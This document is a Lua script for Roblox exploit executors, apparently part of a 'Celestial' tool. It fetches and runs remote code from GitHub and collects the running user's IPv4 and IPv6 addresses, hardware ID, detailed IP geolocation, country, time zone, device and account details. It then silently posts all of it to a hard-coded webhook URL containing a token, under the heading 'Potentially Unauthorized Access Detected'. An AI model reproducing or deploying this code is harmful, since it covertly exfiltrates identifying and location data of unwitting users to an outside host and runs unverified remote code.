local webhookUrl = "https://webhook.newstargeted.com/api/webhooks/1263334435823157332/8tClchkzOnkR_LTbNo14geO_nK1Ha_PXpSvg-OQdLIKEiBW-EIRDdCqlBM6V4ncNYlZO"
local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/main/Utilities.lua"))()

-- Services

local player = game:GetService("Players").LocalPlayer
local localizationservice = game:GetService("LocalizationService")
local httpservice = game:GetService("HttpService")
local userinputservice = game:GetService("UserInputService")

-- Storing Details

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
--local confidentialinformation = game:HttpGet("http://ip-api.com/json")
local ipv4 = utils.getRawSiteData("https://api.ipify.org")
local ipv6 = utils.getRawSiteData("https://api64.ipify.org")
local ipdetails = utils.getRawSiteData("https://ipinfo.io/?token=03dce9579aa8e0")
local geoloc = utils.getRawSiteData("http://www.geoplugin.net/json.gp?ip=" .. ipv4)


-- Checking Functions


-- Checking Celestial Owner

local function checkCelestialOwner()
    if hwid == "E920751F8FEA3C5EC9505ED8F3FB935E627D1D851E3E6738072C7D0C70CE145F20C2AC165D61016A11D5EFB2B0A4664B786E45AEE425937629C5A0FDB9BF9A3" then
        return true
    else
        return false
    end
end

-- Determining Alt Account

local function determineAlt()
    if player.AccountAge >= 30 then
        return false
    else
        return true
    end
end

-- Determining Account Age

local function determineAccountAge(accountAgeInDays)
    local years = math.floor(accountAgeInDays / 365)
    local remainingDays = accountAgeInDays % 365
    local months = math.floor(remainingDays / 30)
    local days = remainingDays % 30

    local ageString = ""

    if years > 0 then
        ageString = ageString .. years .. (years == 1 and " Year" or " Years")
    end

    if months > 0 then
        if #ageString > 0 then
            ageString = ageString .. ", "
        end
        ageString = ageString .. months .. (months == 1 and " Month" or " Months")
    end

    if days > 0 then
        if #ageString > 0 then
            ageString = ageString .. ", "
        end
        ageString = ageString .. days .. (days == 1 and " Day" or " Days")
    end

    return ageString
end

-- Getting Device

local function getDevice()
    if userinputservice.TouchEnabled then
        return "Mobile"
    elseif userinputservice.KeyboardEnabled then
        return "PC"
    elseif userinputservice.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

-- Getting Country

local countryNames = {
    GB = "United Kingdom",
    RU = "Russia",
    CA = "Canada",
    US = "United States",
    CN = "China",
    BR = "Brazil",
    AU = "Australia",
    IN = "India",
    AR = "Argentina",
    KZ = "Kazakhstan",
    DZ = "Algeria",
    CG = "Congo",
    GL = "Greenland",
    SA = "Saudi Arabia",
    MX = "Mexico",
    ID = "Indonesia",
    SD = "Sudan",
    LY = "Libya",
    IR = "Iran",
    CO = "Colombia",
    VN = "Vietnam",
    DK = "Denmark",
    BS = "Bahamas",
    KP = "North Korea",
    KE = "Kenya",
    BO = "Bolivia",
    TD = "Chad",
    PE = "Peru"
}

local function getCountry()
    local shortCountry = localizationservice:GetCountryRegionForPlayerAsync(player)
    
    local fullCountry = countryNames[shortCountry] -- Get the full country name from the table
    
    if not fullCountry then -- If the country code is not in the table, return the short country code as full country
        fullCountry = shortCountry
        warn("Full country not found, using the short country code.")
    end
    
    return shortCountry, fullCountry
end

-- Getting Time Zone

local timeZoneShortCodes = {
    ["Eastern Standard Time"] = "EST",
    ["Eastern Daylight Time"] = "EDT",
    ["Central Standard Time"] = "CST",
    ["Central Daylight Time"] = "CDT",
    ["Mountain Standard Time"] = "MST",
    ["Mountain Daylight Time"] = "MDT",
    ["Pacific Standard Time"] = "PST",
    ["Pacific Daylight Time"] = "PDT",
}

local function getTimeZone()
    local fullTimeZone = os.date("%Z")
    
    local shortTimeZone = timeZoneShortCodes[fullTimeZone] -- Get the short time zone code from the table

    if not shortTimeZone then -- If the full time zone name is not in the table, use the full name as the short code
        shortTimeZone = fullTimeZone
    end
    
    return shortTimeZone, fullTimeZone
end

local shortCountry, fullCountry = getCountry()
local shortTimeZone, fullTimeZone = getTimeZone()


-- Embed


local data = {
    ["embeds"] = {
        {
            ["title"] = "**__" .. player.DisplayName .. " (@" .. player.Name .. ")" .. "__**",
            ["url"] = "https://roblox.com/users/" .. player.UserId .. "/profile",
            ["type"] = "rich",
            ["color"] = tonumber(16711680),
            ["author"] = {
                ["name"] = "Potentially Unauthorized Access Detected",
                --["url"] = "",
                --["icon_url"] = ""
            },
            ["fields"] = {
                {
                    ["name"] = "Execution Date",
                    ["value"] = "**" .. os.date("%x") .. " | " .. os.date("%I:%M %p") .. "**",
                    ["inline"] = true
                },

                {
                    ["name"] = "Celestial Owner",
                    ["value"] = checkCelestialOwner(),
                    ["inline"] = true
                },

                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                            
                {
                    ["name"] = "Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },

                {
                    ["name"] = "User ID",
                    ["value"] = player.UserId,
                    ["inline"] = true
                },

                {
                    ["name"] = "Account Age",
                    ["value"] = determineAccountAge(player.AccountAge) .. " - " .. player.AccountAge .. " Days",
                    ["inline"] = true
                },

                {
                    ["name"] = "Device",
                    ["value"] = getDevice(),
                    ["inline"] = true
                },

                {
                    ["name"] = "**Potential** Alt Account ",
                    ["value"] = determineAlt(),
                    ["inline"] = true
                },

                {
                    ["name"] = "Exploit",
                    ["value"] = identifyexecutor(),
                    ["inline"] = true
                },

                {
                    ["name"] = "Time Zone",
                    ["value"] = fullTimeZone .. " **(" .. shortTimeZone .. ")**",
                    ["inline"] = true
                },

                {
                    ["name"] = "Country",
                    ["value"] = fullCountry .. " **(" .. shortCountry .. ")**",
                    ["inline"] = true
                },

                {
                    ["name"] = "IPv4 (Primary)",
                    ["value"] = "||" .. ipv4 .. "||",
                    ["inline"] = true
                },

                {
                    ["name"] = "IPv6",
                    ["value"] = "||" .. ipv6 .. "||",
                    ["inline"] = true
                },

                {
                    ["name"] = "Hardware ID (HWID)",
                    ["value"] = "||" .. hwid .. "||",
                    ["inline"] = true
                },

                {
                    ["name"] = "IP Address Lookup",
                    ["value"] = "|| [Geo Data Tool](https://www.geodatatool.com/en/?ip=" .. ipv4 .. ") ||",
                    ["inline"] = false
                },

                {
                    ["name"] = "IP Address Geolocation Data",
                    ["value"] = "||```json" .. "\n" .. ipdetails .. "```||",
                    ["inline"] = false
                },

                {
                    ["name"] = "Geolocation Data",
                    ["value"] = "||```json" .. "\n" .. geoloc .. "```||",
                    ["inline"] = false
                },
               }
           }
       }
    }

    local newdata = httpservice:JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
     }

     local request = http_request

     local args = {
         Url = webhookUrl,
         Body = newdata,
         Method = "POST",
         Headers = headers
     }

     request(args)
